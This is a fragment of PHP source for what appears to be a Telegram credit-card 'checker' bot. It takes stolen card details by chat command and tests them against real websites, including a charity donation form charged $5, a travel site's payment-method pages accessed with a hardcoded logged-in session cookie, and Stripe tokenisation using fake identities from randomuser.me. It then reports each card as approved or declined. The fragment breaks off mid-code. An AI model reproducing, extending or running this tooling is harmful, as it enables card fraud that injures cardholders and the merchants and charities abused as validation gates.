  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; __stripe_mid=2e26787c-c102-4578-aa4b-fba54c859921bb7405; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1737508507%7CkQ0NDWvxtUSzjUm9y4tHOdo87KOvxxrAfqXeXAcly6L%7Cb88250a3e9f28c7927434437f6a2d7da9ae501cf6b279b861491bb8baa209e03; __stripe_sid=c8b725f0-d8a9-4fd4-ad28-2cea16b61ba4cd0533; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-08%2002%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2025-01-08%2002%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'upgrade-insecure-requests: 1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.5',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-user: ?1',
    'sec-fetch-dest: document',
    'referer: https://www.thetravelinstitute.com/my-account/add-payment-method/',
    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/\/\d+\/\?_wpnonce=[a-f0-9]+/';
preg_match($patron, $response, $coincidencias);
$url_nonce = $coincidencias[0];
curl_close($curl);

echo "$url_nonce\n";


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.thetravelinstitute.com/my-account/delete-payment-method'.$url_nonce.'',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; __stripe_mid=2e26787c-c102-4578-aa4b-fba54c859921bb7405; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1737508507%7CkQ0NDWvxtUSzjUm9y4tHOdo87KOvxxrAfqXeXAcly6L%7Cb88250a3e9f28c7927434437f6a2d7da9ae501cf6b279b861491bb8baa209e03; __stripe_sid=c8b725f0-d8a9-4fd4-ad28-2cea16b61ba4cd0533; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-08%2002%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2025-01-08%2002%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'upgrade-insecure-requests: 1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.5',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-user: ?1',
    'sec-fetch-dest: document',
    'referer: https://www.thetravelinstitute.com/my-account/payment-methods/',
    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);

curl_close($curl);



} elseif ($success === true && $status === "requires_action") {
    $respo = "3DS Authenticate Rejected ❌";
} else {
    $respo = $message;
}



$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";




if (empty($respo)) {
        $respo = $response;
}


if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree Auth (Wa)\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree Auth (Wa)\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree Auth (Wa)\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Gate Error ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    editMessage($chat_id, $respuesta, $id_text);
} else {
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

}





////https://panoramitalia.com/index.php/subscribe/
elseif((strpos($message, "!br") === 0)||(strpos($message, "/br") === 0)||(strpos($message, ".br") === 0)){

$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano   = $i[2];
$cvv   = $i[3];
$bin = substr($lista, 0, 6);

if (strlen($ano) == 2) {
    $ano = '20' . $ano;
}

$mes = explode("|", $lista);
$mes = intval($mes[1]);


//Verifi//
if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /br CC|MM|YYYY|CVV\n";
    sendMessage($chat_id, $respuesta, $message_id);
    die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin


$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
curl_close($curl);
$binna = json_decode($content,true);
//---------------------------------------------//
$brand = $binna['scheme'];
if (empty($brand)) {
$brand = "Unavailable";
}
//VARIABLES//
$MV = ucwords(strtolower(trim($brand)));
echo "$MV\n";

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://breastcancereducation.org/make-a-donation',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'upgrade-insecure-requests: 1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.7',
    'sec-fetch-site: none',
    'sec-fetch-mode: navigate',
    'sec-fetch-dest: document',
    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron_qfKey = '/<input name="qfKey" type="hidden" value="([^"]+)"/';
$patron_MAX_FILE_SIZE = '/<input name="MAX_FILE_SIZE" type="hidden" value="([^"]+)"/';
preg_match($patron_qfKey, $response, $coincidencias_qfKey);
preg_match($patron_MAX_FILE_SIZE, $response, $coincidencias_MAX_FILE_SIZE);

$qfKey = $coincidencias_qfKey[1];
$MAX_FILE_SIZE = $coincidencias_MAX_FILE_SIZE[1];
curl_close($curl);

/*echo "qfKey: $qfKey\n";
echo "MAX_FILE_SIZE: $MAX_FILE_SIZE\n";
echo "-------------------------------\n";
*/

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => [
    'qfKey' => ''.$qfKey.'',
    'MAX_FILE_SIZE' => ''.$MAX_FILE_SIZE.'',
    'hidden_processor' => '1',
    'payment_processor_id' => '3',
    'priceSetId' => '5',
    'selectProduct' => '',
    '_qf_default' => 'Main:upload',
    'price_3' => '0',
    'price_4' => '5',
    'email-5' => 'Dausitherer@cuvox.de',
    'honor[prefix_id]' => '',
    'honor[first_name]' => '',
    'honor[last_name]' => '',
    'honor[email-1]' => '',
    'honor[note]' => '',
    'honor[image_URL]' => '',
    'custom_28' => '',
    'custom_29' => '',
    'custom_31' => '',
    'custom_30' => '',
    'credit_card_type' => ''.$MV.'',
    'credit_card_number' => ''.$cc.'',
    'cvv2' => $cvv,
    'credit_card_exp_date[M]' => ''.$mes.'',
    'credit_card_exp_date[Y]' => ''.$ano.'',
    'billing_first_name' => 'Carlos',
    'billing_middle_name' => '',
    'billing_last_name' => 'Perez',
    'billing_street_address-5' => '6195 bollinger rd',
    'billing_city-5' => 'New york',
    'billing_country_id-5' => '1228',
    'billing_state_province_id-5' => '1058',
    'billing_postal_code-5' => '10010',
    '_qf_Main_upload' => '1',
  ],
//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=B438Tp5l0XvWfjf46Ood0vja-Uzyc_nIyGpixIR65cg',
    CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
    CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',                                                                                       
    CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'cache-control: max-age=0',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'origin: https://breastcancereducation.org',
            //    'content-type: multipart/form-data; boundary=----WebKitFormBoundaryf5wcYWFVprKL61RK',
    'upgrade-insecure-requests: 1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.7',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-user: ?1',
    'sec-fetch-dest: document',
    'referer: https://breastcancereducation.org/make-a-donation',
    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);





$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfKey.'',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=B438Tp5l0XvWfjf46Ood0vja-Uzyc_nIyGpixIR65cg',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'cache-control: max-age=0',
    'upgrade-insecure-requests: 1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.7',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-user: ?1',
    'sec-fetch-dest: document',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'referer: https://breastcancereducation.org/make-a-donation',
    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/<input name="qfKey" type="hidden" value="([^"]+)"/';
preg_match($patron, $response, $coincidencias);
$qfKey2 = $coincidencias[1];
echo "qfKey: $qfKey2\n";
curl_close($curl);



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'qfKey='.$qfKey2.'&_qf_default=Confirm%3Anext&_qf_Confirm_next=1&custom_28=&custom_29=&custom_31=&custom_30=',
//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=B438Tp5l0XvWfjf46Ood0vja-Uzyc_nIyGpixIR65cg',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/x-www-form-urlencoded',
    'cache-control: max-age=0',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'origin: https://breastcancereducation.org',
    'upgrade-insecure-requests: 1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.7',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-user: ?1',
    'sec-fetch-dest: document',
    'referer: https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfKey.'',
    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact?_qf_Main_display=true&qfKey='.$qfKey2.'',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=B438Tp5l0XvWfjf46Ood0vja-Uzyc_nIyGpixIR65cg',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'cache-control: max-age=0',
    'upgrade-insecure-requests: 1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.7',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-user: ?1',
    'sec-fetch-dest: document',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'referer: https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfkey2.'',
    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
file_put_contents('index.html', $response);
$err = curl_error($curl);

$patron = '/<span class="msg-text">(.*?)<\/span>/';
preg_match($patron, $response, $coincidencias);
$mensaje1 = $coincidencias[1];

if (!empty($mensaje1)){

$patron = '/Payment Processor Error message :\d*\s*(.*)/';
preg_match($patron, $mensaje1, $coincidencias);
$mensaje = trim($coincidencias[1]);

} else {
$patron = '/<li>(.*?)<\/li>/';
preg_match($patron, $response, $coincidencias);
$mensaje = $coincidencias[1];
}
//echo "Mensaje: $mensaje\n";

$respo = $mensaje;
	
curl_close($curl);

$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";



$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";
/*
if ($respo == 'This transaction cannot be processed. Please enter a valid Credit Card Verification Number.'){
$respo = 'Card Issuer Declined CVV';
}*/

if (empty($respo)) {
        $respo = $response;
}

// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'Expiration Date is a required field.') !== false || strpos($respo, 'Please enter a valid Card Verification Number') !== false || strpos($respo, 'This transaction has been declined.') !== false){
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Gate Error❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
} else {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


}



// Checking CC's Commands
elseif((strpos($message, "!stp") === 0)||(strpos($message, "/stp") === 0)||(strpos($message, ".stp") === 0)){

$lista = substr($message, 5);
//$i     = explode("|", $lista);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$cvv   = $i[3];
/*function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};*/

$bin = substr($lista, 0, 6);
////
$num = "$cc$mes$ano$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
if($verify != ""){
$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}

//-----------------------------------------------------//
if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮ɢᴀᴛᴇᴡᴀʏ sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /stp cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !stp cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .stp cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//
$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

////RANDOM USER//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$get = curl_exec($ch);
curl_close($ch);
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];

////SACA EL TOKEN//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
